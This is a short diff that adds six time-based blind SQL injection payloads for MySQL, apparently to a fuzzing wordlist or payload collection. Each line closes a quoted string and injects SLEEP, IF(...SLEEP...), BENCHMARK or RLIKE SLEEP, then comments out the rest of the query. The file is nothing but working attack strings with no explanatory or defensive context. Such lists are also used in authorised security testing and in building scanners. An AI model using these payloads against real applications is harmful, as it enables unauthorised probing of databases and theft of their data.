@@ -1,0 +1,6 @@
+' AND SLEEP(5)-- -
+' OR SLEEP(5)-- -
+' AND IF(1=1,SLEEP(5),0)-- -
+' AND IF(1=2,SLEEP(5),0)-- -
+' AND BENCHMARK(5000000,MD5(1))-- -
+' AND RLIKE SLEEP(5)-- -
